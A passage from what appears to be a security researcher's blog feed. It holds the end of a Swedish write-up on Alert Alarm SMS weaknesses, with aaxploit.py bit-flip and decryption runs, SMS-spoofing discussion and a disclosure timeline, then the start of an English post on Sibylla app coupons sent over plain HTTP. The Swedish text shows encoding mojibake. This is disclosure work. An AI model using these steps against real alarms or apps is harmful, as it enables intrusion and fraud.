exemplet nedan visar jag hur man kan Ã¤ndra &amp;quot;&lt;tt class="docutils literal"&gt;i&lt;/tt&gt;&amp;quot; biten (larm av/pÃ¥).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b --flip &lt;span class="m"&gt;112&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d244e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              None &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000000000&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: flip bits
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Modified IV:      d245e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Modified SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Om vi t.ex. anvÃ¤nder vÃ¥rt modifierade SMS frÃ¥n ovan och dekrypterar det, sÃ¥ kan
vi se att &lt;tt class="docutils literal"&gt;i&lt;/tt&gt; fÃ¤ltet har Ã¤ndrats frÃ¥n &amp;quot;0&amp;quot; till &amp;quot;1&amp;quot;. JÃ¤mfÃ¶r vi t.ex. med
meddelandet frÃ¥n ovan (i sektionen &amp;quot;Dekryptera ett Alert Alarm SMS&amp;quot;), sÃ¥ ser vi
att detta skett.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py --input d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p &lt;span class="m"&gt;1234&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Original SMS:     d245e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d245e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              &lt;span class="m"&gt;30303030303030303030303031323334&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000001234&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: decryption
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: &lt;span class="p"&gt;|&lt;/span&gt; sms_v &lt;span class="p"&gt;|&lt;/span&gt; i &lt;span class="p"&gt;|&lt;/span&gt; j &lt;span class="p"&gt;|&lt;/span&gt; year &lt;span class="p"&gt;|&lt;/span&gt; month &lt;span class="p"&gt;|&lt;/span&gt; day &lt;span class="p"&gt;|&lt;/span&gt; hour &lt;span class="p"&gt;|&lt;/span&gt; minute &lt;span class="p"&gt;|&lt;/span&gt; user_id &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;:       &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;     &lt;span class="m"&gt;19&lt;/span&gt;     0x6    &lt;span class="m"&gt;03&lt;/span&gt;     &lt;span class="m"&gt;08&lt;/span&gt;       &lt;span class="m"&gt;48&lt;/span&gt;        &lt;span class="m"&gt;01&lt;/span&gt;
                  /&lt;span class="se"&gt;\&lt;/span&gt;
                  &lt;span class="p"&gt;|&lt;/span&gt;----- changed from &lt;span class="m"&gt;0&lt;/span&gt; to &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Notera att man kan Ã¤ndra vilket bit som helst, dvs det Ã¤r fÃ¶rmodligen mÃ¶jligt
att ta ett gammalt och giltigt Alert Alarm SMS och Ã¤ndra datum/klockslag till
&amp;quot;nu&amp;quot; och skicka detta meddelande igen.&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="andra-attacker"&gt;
&lt;h2&gt;Andra attacker?&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Ã„r Alert Alarm systemet mottagligt fÃ¶r &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Replay_attack"&gt;replay attacks&lt;/a&gt;? Dvs kan man
framgÃ¥ngsrikt skicka samma SMS mer Ã¤n en gÃ¥ng?&lt;ul&gt;
&lt;li&gt;Nej, denna attack fungerar inte. Om man skickar samma SMS tvÃ¥ gÃ¥nger, sÃ¤ger
larmenheten &amp;quot;FjÃ¤rrkontroll, felkod 2&amp;quot;. Ã„ven om man lÃ¤gger till en minut till
meddelandet, sÃ¥ fungerar det Ã¤ndÃ¥ inte. FÃ¶rmodligen gÃ¶r man nÃ¥gon kontroll
pÃ¥ serversidan hos Alert Alarm. Man gÃ¶r fÃ¶rmodligen nÃ¥gon typ av
hash-kontroll eller rent av kontrollerar att ett SMS inte Ã¤r fÃ¶r gammalt.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Kommer Alert Alarms SMS server att detektera bruteforce attacker? Dvs, kan en
godtycklig person skicka 9999 SMS under en inte allt fÃ¶r lÃ¥ng tidsperiod utan
att Alert Alarm detekterar det? Om det inte detekteras innebÃ¤r det att alla
Alert Alarm Ã¤gare kan bli attackerade!&lt;ul&gt;
&lt;li&gt;Jag har inte fÃ¥tt detta bekrÃ¤ftat av Alert Alarm / Verisure. Men det Ã¤r
absolut nÃ¥got man kan prÃ¶va om man har tid och lust.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Tillagt 2020-01-05&lt;/strong&gt;: Efter att andra Alert Alarm anvÃ¤ndare bekrÃ¤ftat att
det inte rÃ¶r sig om ett unikt SMS nummer kan vi helt enkelt sÃ¤ga att det
inte Ã¤r praktiskt gÃ¶rbart att utfÃ¶ra denna bruteforce attack eftersom det
skulle krÃ¤vas allt fÃ¶r mÃ¥nga SMS fÃ¶r att lyckas med attacken i praktiken.
FÃ¶rvÃ¤xla dock inte denna bruteforce attack med bruteforce attacken pÃ¥ SMSen
(det Ã¤r tvÃ¥ olika attacker).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="oppna-fragor"&gt;
&lt;h2&gt;Ã–ppna frÃ¥gor&lt;/h2&gt;
&lt;p&gt;Jag undrar varfÃ¶r Alert Alarm valt att anvÃ¤nda SMS fÃ¶r att larma av/pÃ¥ systemen
nÃ¤r det redan finns en datakoppling till appen (och 2019 har vÃ¤l alla
datauppkoppling?)? Det gÃ¥r inte gÃ¶ra ett vettigt nyckelutbyte (Diffie Hellman)
nÃ¤r man bara kommunicerar pÃ¥ ett hÃ¥ll. Med datakopplingen hade man Ã¥tminstone
kunnat gÃ¶ra det pÃ¥ ett bÃ¤ttre sÃ¤tt. Nuvarande lÃ¶sning innebÃ¤r fÃ¶rmodligen att
det fungerar i stil med detta:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Alert Alarm SMS'et skickas till deras server.&lt;/li&gt;
&lt;li&gt;Servern dekrypterar SMS'et, kontrollerar parametrarna och skickar vidare
kommandot, dvs larma av/pÃ¥ (via datauppkopplingen Ã¶ver GSM) till larmÃ¤garens
huvudenhet som kontrollerar larmet.&lt;/li&gt;
&lt;li&gt;NÃ¤r hemlarmet Ã¤ndrat status sÃ¥ fÃ¥r Android appen en notifiering som bekrÃ¤ftar
larmets nya status.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Tillagt 2020-01-05&lt;/strong&gt;: Efter att andra Alert Alarm anvÃ¤ndare bekrÃ¤ftat att
det inte rÃ¶r sig om ett unikt SMS nummer kan vi avskriva att resonemanget ovan
ej Ã¤r korrekt. IstÃ¤llet Ã¤r det fÃ¶rmodligen SMS -&amp;gt; larmenhet -&amp;gt; Ã¤ndra status -&amp;gt;
informera Alert Alarm servern -&amp;gt; visa statusÃ¤ndring i appen. Men, det Ã¤r
omÃ¶jligt att sÃ¤ga hur det fungerar pÃ¥ egen hand, Alert Alarm behÃ¶ver bekrÃ¤fta.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="fragor-och-pastaende-pa-forum-etc"&gt;
&lt;h2&gt;FrÃ¥gor och pÃ¥stÃ¥ende pÃ¥ forum etc&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Tillagt 2020-01-05&lt;/strong&gt;: Eftersom personer efter publicering bÃ¶rjat stÃ¤lla frÃ¥gor
och diskutera denna artikel tÃ¤nkte jag bemÃ¶ta nÃ¥gra av dessa hÃ¤r.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Q: SMS Ã¤r faktiskt en bra sak eftersom det finns platser utan mobiltÃ¤ckning.&lt;ul&gt;
&lt;li&gt;A: Jag hÃ¥ller med om det pÃ¥stÃ¥endet. Eftersom jag bor i ett land dÃ¤r
tÃ¤ckningen generellt sett Ã¤r vÃ¤ldigt bra drog jag kanske denna slutsats lite
fÃ¶rhastat. Men, om man vÃ¤ljer att bygga in SMS som en del i sin lÃ¶sning
mÃ¥ste man sÃ¤kerhetstÃ¤lla att den Ã¤r robust. En &amp;quot;man in the middle&amp;quot; skall
inte fÃ¥ nÃ¥got vettigt ur det som skickas mellan Ã¤garens telefon (eller
larmsystem) och mottagaren as data/SMSet.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q: Kommer den som utfÃ¶r en SMS bruteforce attack fÃ¥ ett meddelande om det
lyckats?&lt;ul&gt;
&lt;li&gt;A: Nej, det Ã¤r bara ett vanligt SMS som skickas ut, vilket i praktiken
innebÃ¤r att man fÃ¶r att vara pÃ¥ sÃ¤kra sidan hade behÃ¶vt skicka ut lika mÃ¥nga
SMS som nyckelrymden Ã¤r (9999 nycklar). Som nÃ¤mnts pÃ¥ andra stÃ¤lle i denna
artikel efter uppdateringen 2020-01-05 sÃ¥ kan man dra slutsatsen att just
denna attack ej Ã¤r praktiskt gÃ¶rbar eftersom man Ã¤ven behÃ¶ver gissa rÃ¤tt
telefonnummer ocksÃ¥. Det blir helt enkelt fÃ¶r mÃ¥nga SMS.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q: Ett inbrottslarm inger falsk sÃ¤kerhet, i bÃ¤sta fall stressar det
inbrottstjuven alternativt att de vÃ¤ljer en grannes hus utan larm istÃ¤llet fÃ¶r
dit eget hus.&lt;ul&gt;
&lt;li&gt;A: Jag hÃ¥ller nog med om det. Om polis och/eller en vakt hade varit pÃ¥ plats
ett par minuter efter att larmet gÃ¥tt sÃ¥ hade det varit riktigt vÃ¤rdefullt.
Men jag tror att mÃ¥nga hÃ¥ller med mig nÃ¤r jag sÃ¤ger att sÃ¥ Ã¤r inte fallet.
Det kan ta ganska lÃ¥ng stund innan nÃ¥gon dyker upp? Finns det statistik pÃ¥
det? Man skall dock inte glÃ¶mma att idag har &amp;quot;larm&amp;quot; mÃ¥nga andra bra saker
kopplade, t.ex. brandlarm, larm om vattenlÃ¤ckor osv.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="kontakt-med-alert-alarm-verisure"&gt;
&lt;h2&gt;Kontakt med Alert Alarm / Verisure&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;3:e Juli 2019&lt;/strong&gt;: Jag rapporterar via Alert Alarms support sida att jag har
hittat svagheter/sÃ¤kerhetshÃ¥l i deras larmlÃ¶sning.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;9:e Juli 2019&lt;/strong&gt;: Ã„nnu inget svar, sÃ¥ jag rapporterar detsamma som ett privat
meddelande till Alert Alarm via Facebook.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;10:e Juli 2019&lt;/strong&gt;:&lt;ul&gt;
&lt;li&gt;Alert Alarm svarar via Facebook att de har skickat vidare min
kontaktinformation till de som utvecklar appen.&lt;/li&gt;
&lt;li&gt;Verisure's Information Security Mangager fÃ¶rsÃ¶ker nÃ¥ mig, fÃ¶rst via telefon,
sen via email.&lt;/li&gt;
&lt;li&gt;Jag skickar Ã¶ver rapporten (i princip denna blog post) tillsammans med
&amp;quot;proof of concept&amp;quot; skriptet.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;12:e Augusti 2019&lt;/strong&gt;: TelefonmÃ¶te med Verisure, jag fÃ¥r en statusuppdatering
och Verisure meddelar ett de behÃ¶ver mer Ã¤n standard 90-dagars &amp;quot;yppande-tid&amp;quot;
(eng. disclosure time) vilket jag Ã¤r med pÃ¥.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2:a Oktober 2019&lt;/strong&gt;: Jag hÃ¶r av mig till Verisure och efterfrÃ¥gar
uppdateringar. Meddelandet jag fÃ¥r Ã¤r att de fortfarande arbetar pÃ¥ en
lÃ¶sning och att de hÃ¥ller pÃ¥ att testa nÃ¥got som skall fungera. De lovar att
Ã¥terkomma inom kort. Jag stÃ¤ller frÃ¥gan om vi skall skapa CVE nummer fÃ¶r
detta, jag fÃ¥r inget direkt svar pÃ¥ det.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;4:e November 2019&lt;/strong&gt;: Jag hÃ¶r av mig till Verisure igen fÃ¶r att hÃ¶ra hur det
gÃ¥r.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;7:e November 2019&lt;/strong&gt;: Verisure svarar i princip med samma meddelande som 2:a
Oktober och lovar att Ã¥terkomma inom kort.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="siduppdateringar"&gt;
&lt;h2&gt;Siduppdateringar&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;1:a Januari 2020&lt;/strong&gt;: Jag summerar och renskriver denna artikel och publicerar
allt. Anledningen att jag gÃ¶r det denna dag Ã¤r att det Ã¤r ett halvÃ¥r sen jag
rapporterade sÃ¤kerhetshÃ¥len och hade man menat allvar med att lÃ¶sa dem, sÃ¥
hade man bÃ¥de lÃ¶st problemen vid det hÃ¤r laget samt Ã¥terkopplat bÃ¤ttre till
mig.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3:e Januari 2020&lt;/strong&gt;: Uppdaterar artikeln fÃ¶r att klargÃ¶ra Verisure vs Alert
Alarms roll i det hela.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5:e Januari 2020&lt;/strong&gt;: Uppdaterar artikeln med ytterligare information angÃ¥ende
SMS attacken och har lagt till en sektion med frÃ¥gor etc som blivit stÃ¤llda pÃ¥
forum osv.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="sammanfatting"&gt;
&lt;h2&gt;Sammanfatting&lt;/h2&gt;
&lt;p&gt;SÃ¤kertheten i Alert Alarms lÃ¶sning bygger&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Larmkoden och&lt;/li&gt;
&lt;li&gt;och SMS avsÃ¤ndarens telefonnummer och&lt;/li&gt;
&lt;li&gt;att ingen kan pÃ¥ nÃ¥got sÃ¤tt fÃ¥ tag pÃ¥ en annan persons Alert Alarm SMS.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Faktum Ã¤r det att man kan argumentera att sÃ¤kerheten endast hÃ¤nger pÃ¥ &amp;quot;3&amp;quot;
eftersom det Ã¤r trivialt att ta reda pÃ¥ larmkoden om man har ett SMS (det Ã¤r var
bruteforce attacken i &lt;cite&gt;aaxploit.py&lt;/cite&gt; gÃ¶r). GÃ¤llande &amp;quot;2&amp;quot;, sÃ¥ finns telefonnummer
tillgÃ¤ngligt Ã¶verallt (hitta.se, eniro.se etc), dvs det Ã¤r inte svÃ¥rt att fÃ¥
reda pÃ¥ en persons mobiltelefonnummer.&lt;/p&gt;
&lt;p&gt;Alert Alarm verkar ha fÃ¶rsÃ¶kt &amp;quot;lÃ¥sa&amp;quot; deras SMS service till specifika anvÃ¤ndare,
dvs larmÃ¤garen mÃ¥ste lÃ¤gga till sig eget och andra personers mobiltelefonnummer
i hushÃ¥llet i appen fÃ¶r att de skall kunna larma av/pÃ¥ systemet. SÃ¥ vid fÃ¶rsta
anblick verkar det som att det Ã¤r endast dessa person som kan slÃ¥ av/pÃ¥ larmet,
men faktum Ã¤r att det finns mÃ¥nga tjÃ¤nster pÃ¥ internet som erbjuder folk att
skicka fejkade SMS, dvs SMS som ser ut att komma frÃ¥n ett specifikt
telefonnummer (sÃ¶k efter &lt;a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;amp;oq=send+spoofed+sms"&gt;spoofed SMS&lt;/a&gt;). Dvs det Ã¤r fullt mÃ¶jligt att skapa
ett giltigt Alert Alarm SMS m.ha. &lt;a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py"&gt;aaxploit.py&lt;/a&gt; och sen anvÃ¤nda nÃ¥gon av dessa
tjÃ¤nster fÃ¶r att skicka ett fejkat men giltigt SMS fÃ¶r att antingen stÃ¤nga av
eller slÃ¥ pÃ¥ en annan persons hemlarm. Allt detta utan larmÃ¤garens vetskap.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Skall Alert Alarm Ã¤gare vara oroliga?&lt;/strong&gt; Att fÃ¥ tag pÃ¥ ett Alert Alarm SMS frÃ¥n
nÃ¥gon annan Ã¤r fÃ¶rmodligen inte helt lÃ¤tt, men Ã¥ andra sidan inte heller
omÃ¶jligt. OlÃ¥sta mobiltelefoner frÃ¥n kollegor pÃ¥ jobb? Skriva en helt annan
Android app som kan lÃ¤sa SMS osv. Sen vet vi inte heller om Alert Alarm
detekterar en bruteforce attack pÃ¥ serversidan som tar emot SMS. &lt;strong&gt;Om&lt;/strong&gt; de
&lt;strong&gt;inte&lt;/strong&gt; detekterar en sÃ¥dan attack, dÃ¥ Ã¤r det ganska enkelt att attackera vem
som helst som Ã¤ger ett Alert Alarm system.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;Tillagt 2020-01-05&lt;/strong&gt;: Efter att andra Alert Alarm anvÃ¤ndare har bekrÃ¤ftat att
det rÃ¶r som vad som verkar vare unika SMS nummer per anvÃ¤ndare kan vi dra
slutsatsen att det inte Ã¤r praktiskt gÃ¶rbart att gÃ¶ra bruteforce attacken dÃ¤r
man skickar mÃ¥nga SMS eftersom det skulle krÃ¤va allt fÃ¶r mÃ¥nga SMS fÃ¶r att
lyckas. Med andra ord Alert Alarm Ã¤gare behÃ¶ver inte vara oroliga fÃ¶r denna
attack. FÃ¶rvÃ¤xla dock inte detta med bruteforce attacken pÃ¥ sjÃ¤lv SMSen fÃ¶r
att fÃ¥ tag pÃ¥ rÃ¤tt kod till larmet. Det fungerar som beskrivits, dvs en &amp;quot;man
in the middle&amp;quot; kan luska ut koden fÃ¶r att larma pÃ¥/av till nÃ¥gon annans larm
system. Vad vi vill se Ã¤r ett robust protokoll designat sÃ¥ att en &amp;quot;man in the
middle&amp;quot; inte kan fÃ¥ ut &lt;strong&gt;nÃ¥gon&lt;/strong&gt; anvÃ¤ndbar information frÃ¥n data som skickas
mellan larm Ã¤garens telefon och mottagarsidan av data/SMSet.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I vilket fall som helst, svagheterna/sÃ¤kerhetshÃ¥len jag hittat Ã¤r ganska
allvarliga och ger en illvillig person flera mÃ¶jligheter att attackera deras
system. Detta Ã¤r attacker som inte borde vara mÃ¶jliga att gÃ¶ra pÃ¥ ett
larmsystems som Ã¤r tÃ¤nkt att skydda vÃ¥ra hem frÃ¥n inbrott. Jag och andra kunder
vill inte att vÃ¥rt larmsystem har sÃ¥dana hÃ¤r svagheter. Nuvarande lÃ¶sning Ã¤r vad
man pÃ¥ engelska kallar &amp;quot;&lt;a class="reference external" href="https://en.wikipedia.org/wiki/Security_through_obscurity"&gt;Security by Obscurity&lt;/a&gt;&amp;quot;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="om-mig"&gt;
&lt;h2&gt;Om mig&lt;/h2&gt;
&lt;p&gt;Jag heter Joakim Bech och har jobbat med sÃ¤kerhet fÃ¶r embedded devices de
senaste 12 Ã¥ren. Det som beskrivs i denna artikel har jag gjort pÃ¥ min fritid,
men i Ã¶vrigt sÃ¥ leder jag teamet som jobbar med sÃ¤kerhet pÃ¥ fÃ¶retaget &lt;a class="reference external" href="https://www.linaro.org/"&gt;Linaro&lt;/a&gt;
dÃ¤r jag varit anstÃ¤lld sen lite mer Ã¤n sex Ã¥r tillbaka.&lt;/p&gt;
&lt;/div&gt;
</content><category term="Hacking"></category></entry><entry><title>Sibylla - Unlimited discount coupons</title><link href="https://jyx.github.io/sibylla-unlimited-discount-coupons.html" rel="alternate"></link><published>2018-08-19T00:00:00+02:00</published><updated>2018-08-19T00:00:00+02:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2018-08-19:/sibylla-unlimited-discount-coupons.html</id><summary type="html">&lt;h1&gt;tl;dr&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;The Sibylla app uses plain &lt;code&gt;HTTP&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Not any verification of email used when logging into the app.&lt;/li&gt;
&lt;li&gt;The Sibylla server stores whether a coupon has been consumed or not for a
  certain email address.&lt;/li&gt;
&lt;li&gt;The app doesn't use the stored information at the server to decide whether a
  coupon has been used or not for a certain email.&lt;/li&gt;
&lt;li&gt;The "consumed" value seems to be stored locally in the app.&lt;/li&gt;
&lt;li&gt;Wiping the data/cache in Android's app settings will â€¦&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h1&gt;tl;dr&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;The Sibylla app uses plain &lt;code&gt;HTTP&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Not any verification of email used when logging into the app.&lt;/li&gt;
&lt;li&gt;The Sibylla server stores whether a coupon has been consumed or not for a
  certain email address.&lt;/li&gt;
&lt;li&gt;The app doesn't use the stored information at the server to decide whether a
  coupon has been used or not for a certain email.&lt;/li&gt;
&lt;li&gt;The "consumed" value seems to be stored locally in the app.&lt;/li&gt;
&lt;li&gt;Wiping the data/cache in Android's app settings will clear everything and
  will enable the coupons again. I.e., it is possible to use the same
  discount/offer as many times you wish.&lt;/li&gt;
&lt;li&gt;A rouge person can "use up" all coupons for any email (from a server point of view).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h1&gt;The long version&lt;/h1&gt;
&lt;p&gt;Sibylla is a company who has been serving fast food for decades in Sweden. I'm
just back from &lt;a href="https://www.defcon.org/html/defcon-26/dc-26-index.html"&gt;DEF CON 26&lt;/a&gt; where I picked up a
&lt;a href="https://wifipineapple.com/nano"&gt;WiFi Pineapple Nano&lt;/a&gt;. When playing with the
pineapple I enabled the &lt;a href="https://www.wifipineapple.com/modules"&gt;DWall&lt;/a&gt; module,
which basically sniffs plain HTTP traffic (i.e., non-encrypted). As a side
effect of Google deciding to marking plain &lt;code&gt;HTTP&lt;/code&gt; as insecure in Google Chrome,
more and more sites have switched to use &lt;code&gt;HTTPS&lt;/code&gt; only, but there are still
plenty of un-encrypted traffic on the net. Out of curiosity I connected my
mobile to the WLAN shared by the pineapple and watched for traffic on DWall. I
tried a couple of different apps, some where dead silent and some showed some
&lt;code&gt;URLs&lt;/code&gt;, cookies and images. The Sibylla app seemed to communicate using plain
&lt;code&gt;HTTP&lt;/code&gt; and this is what can be seen when starting the app.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://www.sibylla.se/ui/services/CampaignService.ashx?requestType&lt;span class="o"&gt;=&lt;/span&gt;getAllCoupons
http://www.sibylla.se/ui/services/CampaignService.ashx?requestType&lt;span class="o"&gt;=&lt;/span&gt;getAllCampaigns
http://www.sibylla.se/ui/services/CampaignService.ashx?requestType&lt;span class="o"&gt;=&lt;/span&gt;getAllCouponsForUser&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;userId&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;email_foo.bar@moo.com
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All calls here gets a &lt;a href="https://en.wikipedia.org/wiki/JSON"&gt;JSON&lt;/a&gt; encoded payload
in return, looking something like this.&lt;/p&gt;
&lt;p&gt;getAllCoupons query returns:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pageId&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1969&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;created&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2018-06-28 09:16&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;stoppublish&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2018-09-03 00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Super Meal 2 fÃ¶r 99kr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Super Meal 2 fÃ¶r 99kr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;imageUrl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://sibylla.se/PageFiles/6301/2_st_Super_Meal_99kr.png&amp;quot;&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pageId&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1970&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;created&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2018-06-28 09:16&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;stoppublish&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2018-09-03 00:00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10kr rabatt mjukglass&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
